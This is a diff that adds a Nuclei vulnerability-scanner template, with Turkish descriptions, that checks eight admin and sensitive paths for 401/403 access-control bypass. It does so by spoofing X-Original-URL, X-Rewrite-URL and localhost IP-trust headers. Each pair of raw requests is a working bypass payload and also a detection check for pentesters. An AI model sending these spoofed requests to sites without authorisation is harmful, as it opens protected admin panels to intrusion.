@@ -1,0 +1,181 @@
+id: access-control-bypass
+
+info:
+  name: Access Control / 403-401 Bypass (Erişim Denetimi Atlatma)
+  author: ertansa
+  severity: high
+  description: |
+    Korumalı yönetim/duyarlı yolları önce normal GET ile ister (401/403 beklenir),
+    ardından aynı yolu istek yeniden yazma ve IP-güven başlıklarıyla (X-Original-URL,
+    X-Rewrite-URL, X-Forwarded-For, X-Custom-IP-Authorization, X-Originating-IP vb.)
+    tekrar dener. Her yol için yalnızca BASELINE isteği 401/403 dönüp bypass isteği
+    200 döndüğünde ateşlenir; bu durum geçişi zorunlu olduğundan her yola 200 dönen
+    SPA/temiz sitelerde yanlış pozitif üretmez. İstekler req-condition ile ilişkilendirilir
+    (status_code_N). İngilizce + Türkçe yollar. -dast gerektirmez.
+    OWASP Top 10: A01:2021 - Broken Access Control.
+  reference:
+    - https://owasp.org/Top10/A01_2021-Broken_Access_Control/
+    - https://book.hacktricks.xyz/pentesting-web/403-and-401-bypasses
+    - https://portswigger.net/web-security/access-control
+  classification:
+    cwe-id: CWE-284
+  metadata:
+    max-request: 16
+  tags: access-control,bypass,auth-bypass,owasp,owasp-a01
+
+http:
+  - raw:
+      # Çift 1 — /admin
+      - |
+        GET /admin HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Original-URL: /admin
+        X-Rewrite-URL: /admin
+        X-Forwarded-For: 127.0.0.1
+        X-Custom-IP-Authorization: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        Connection: close
+      # Çift 2 — /administrator
+      - |
+        GET /administrator HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Original-URL: /administrator
+        X-Rewrite-URL: /administrator
+        X-Forwarded-For: 127.0.0.1
+        X-Custom-IP-Authorization: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        Connection: close
+      # Çift 3 — /manager
+      - |
+        GET /manager HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Original-URL: /manager
+        X-Rewrite-URL: /manager
+        X-Forwarded-For: 127.0.0.1
+        X-Custom-IP-Authorization: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        Connection: close
+      # Çift 4 — /dashboard
+      - |
+        GET /dashboard HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Original-URL: /dashboard
+        X-Rewrite-URL: /dashboard
+        X-Forwarded-For: 127.0.0.1
+        X-Custom-IP-Authorization: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        Connection: close
+      # Çift 5 — /server-status (Apache)
+      - |
+        GET /server-status HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Original-URL: /server-status
+        X-Rewrite-URL: /server-status
+        X-Forwarded-For: 127.0.0.1
+        X-Custom-IP-Authorization: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        Connection: close
+      # Çift 6 — /actuator (Spring)
+      - |
+        GET /actuator HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Original-URL: /actuator
+        X-Rewrite-URL: /actuator
+        X-Forwarded-For: 127.0.0.1
+        X-Custom-IP-Authorization: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        Connection: close
+      # Çift 7 — /yonetim (Türkçe)
+      - |
+        GET /yonetim HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Original-URL: /yonetim
+        X-Rewrite-URL: /yonetim
+        X-Forwarded-For: 127.0.0.1
+        X-Custom-IP-Authorization: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        Connection: close
+      # Çift 8 — /yonetici (Türkçe)
+      - |
+        GET /yonetici HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Original-URL: /yonetici
+        X-Rewrite-URL: /yonetici
+        X-Forwarded-For: 127.0.0.1
+        X-Custom-IP-Authorization: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        Connection: close
+
+    req-condition: true
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: bypass-admin
+        dsl: ["status_code_1 == 401 || status_code_1 == 403", "status_code_2 == 200", "len(body_2) > 0"]
+        condition: and
+      - type: dsl
+        name: bypass-administrator
+        dsl: ["status_code_3 == 401 || status_code_3 == 403", "status_code_4 == 200", "len(body_4) > 0"]
+        condition: and
+      - type: dsl
+        name: bypass-manager
+        dsl: ["status_code_5 == 401 || status_code_5 == 403", "status_code_6 == 200", "len(body_6) > 0"]
+        condition: and
+      - type: dsl
+        name: bypass-dashboard
+        dsl: ["status_code_7 == 401 || status_code_7 == 403", "status_code_8 == 200", "len(body_8) > 0"]
+        condition: and
+      - type: dsl
+        name: bypass-server-status
+        dsl: ["status_code_9 == 401 || status_code_9 == 403", "status_code_10 == 200", "len(body_10) > 0"]
+        condition: and
+      - type: dsl
+        name: bypass-actuator
+        dsl: ["status_code_11 == 401 || status_code_11 == 403", "status_code_12 == 200", "len(body_12) > 0"]
+        condition: and
+      - type: dsl
+        name: bypass-yonetim
+        dsl: ["status_code_13 == 401 || status_code_13 == 403", "status_code_14 == 200", "len(body_14) > 0"]
+        condition: and
+      - type: dsl
+        name: bypass-yonetici
+        dsl: ["status_code_15 == 401 || status_code_15 == 403", "status_code_16 == 200", "len(body_16) > 0"]
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - "'Erisim denetimi atlatildi — korumali bir yol baseline 401/403 iken X-Original-URL/IP-guven basliklariyla 200 dondu'"
